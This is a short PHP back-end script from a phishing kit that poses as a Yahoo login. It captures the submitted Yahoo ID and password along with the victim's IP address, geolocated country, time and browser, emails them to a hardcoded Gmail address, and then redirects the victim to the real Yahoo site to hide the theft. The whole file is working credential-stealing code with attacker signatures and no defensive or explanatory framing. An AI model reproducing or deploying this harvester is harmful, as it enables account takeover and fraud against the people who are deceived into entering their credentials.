<?
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$browser  =     $_SERVER['HTTP_USER_AGENT'];
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$message .= "------------ : || YAHOO! GOD 1ST SON || :-------------\n";
$message .= "Yahoo! ID              : ".$_POST['id']."\n";
$message .= "Password               : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .=     "Date & Time : ".$adddate."\n";
$message .= 	"User-Agent: ".$browser."\n";
$message .= "--------------: || CREATED BY FLEX   || :---------------\n";
$recipient ="sureglory2021@gmail.com";
$subject = "YaHOO |  $ip | $adddate\n\n";
mail($recipient,$subject,$message);
header("Location: http://www.yahoo.com");
?>